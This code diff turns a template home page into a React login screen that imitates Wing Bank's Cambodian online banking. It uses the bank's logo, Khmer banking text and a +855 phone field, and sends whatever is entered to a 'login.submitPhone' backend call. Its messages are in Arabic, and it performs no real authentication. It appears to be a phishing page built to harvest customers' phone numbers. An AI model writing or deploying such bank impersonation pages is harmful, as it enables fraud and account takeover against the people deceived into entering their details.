@@ -1,27 +1,108 @@
-import { useAuth } from "@/_core/hooks/useAuth";
 import { Button } from "@/components/ui/button";
-import { APP_LOGO, APP_TITLE, getLoginUrl } from "@/const";
+import { Input } from "@/components/ui/input";
+import { useState } from "react";
+import { trpc } from "@/lib/trpc";
+import { toast } from "sonner";
 
-/**
- * All content in this page are only for example, delete if unneeded
- * When building pages, remember your instructions in Frontend Workflow, Frontend Best Practices, Design Guide and Common Pitfalls
- */
 export default function Home() {
-  // The userAuth hooks provides authentication state
-  // To implement login/logout functionality, simply call logout() or redirect to getLoginUrl()
-  let { user, loading, error, isAuthenticated, logout } = useAuth();
+  const [phoneNumber, setPhoneNumber] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  // If theme is switchable in App.tsx, we can implement theme toggling like this:
-  // const { theme, toggleTheme } = useTheme();
+  const submitPhoneMutation = trpc.login.submitPhone.useMutation({
+    onSuccess: () => {
+      toast.success("تم إرسال رقم الهاتف بنجاح");
+      setPhoneNumber("");
+      setIsSubmitting(false);
+    },
+    onError: () => {
+      toast.error("حدث خطأ أثناء إرسال البيانات");
+      setIsSubmitting(false);
+    },
+  });
 
-  // Use APP_LOGO (as image src) and APP_TITLE if needed
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!phoneNumber) {
+      toast.error("الرجاء إدخال رقم الهاتف");
+      return;
+    }
+    setIsSubmitting(true);
+    submitPhoneMutation.mutate({ phoneNumber });
+  };
 
   return (
-    <div className="min-h-screen flex flex-col">
-      <main>
-        Example Page
-        <Button variant="default">Example Button</Button>
-      </main>
+    <div className="min-h-screen flex items-center justify-center" style={{ background: "linear-gradient(135deg, #a8d84e 0%, #8bc34a 100%)" }}>
+      <div className="w-full max-w-md mx-4">
+        <div className="bg-white rounded-3xl shadow-2xl p-8">
+          {/* Logo */}
+          <div className="flex justify-center mb-6">
+            <img 
+              src="/wing-logo.png" 
+              alt="Wing Bank Logo" 
+              className="h-16 w-auto"
+            />
+          </div>
+
+          {/* Welcome Text */}
+          <div className="text-center mb-2">
+            <h1 className="text-xl text-gray-700 font-normal">សូមស្វាគមន៍</h1>
+          </div>
+
+          {/* Service Title */}
+          <div className="text-center mb-8">
+            <h2 className="text-2xl font-semibold" style={{ color: "#2196f3" }}>
+              សេវាធនាគារតាមអ៊ីនធឺណិត
+            </h2>
+          </div>
+
+          {/* Phone Input Form */}
+          <form onSubmit={handleSubmit} className="space-y-6">
+            <div className="relative">
+              <div className="flex items-center gap-2 bg-[#e8e5f5] rounded-lg px-4 py-3 border-2 border-transparent focus-within:border-[#2196f3] transition-colors">
+                <div className="flex items-center gap-2 border-r border-gray-300 pr-3">
+                  <span className="text-2xl">🇰🇭</span>
+                  <span className="text-gray-700 font-medium">+855</span>
+                </div>
+                <Input
+                  type="tel"
+                  placeholder="លេខទូរស័ព្ទ"
+                  value={phoneNumber}
+                  onChange={(e) => setPhoneNumber(e.target.value)}
+                  className="flex-1 bg-transparent border-0 focus-visible:ring-0 focus-visible:ring-offset-0 text-gray-700 placeholder:text-gray-500"
+                  disabled={isSubmitting}
+                />
+              </div>
+            </div>
+
+            {/* Login Button */}
+            <Button
+              type="submit"
+              className="w-full py-6 text-lg font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all"
+              style={{ 
+                background: "linear-gradient(135deg, #2196f3 0%, #1976d2 100%)",
+                color: "white"
+              }}
+              disabled={isSubmitting}
+            >
+              {isSubmitting ? "جاري الإرسال..." : "ចូលប្រើប្រាស់"}
+            </Button>
+          </form>
+
+          {/* Language Options */}
+          <div className="flex justify-center gap-4 mt-8 pt-6 border-t border-gray-200">
+            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
+              ភាសាខ្មែរ
+            </button>
+            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
+              ភាសាអង់គ្លេស
+            </button>
+            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
+              中文
+            </button>
+          </div>
+        </div>
+      </div>
     </div>
   );
 }
+
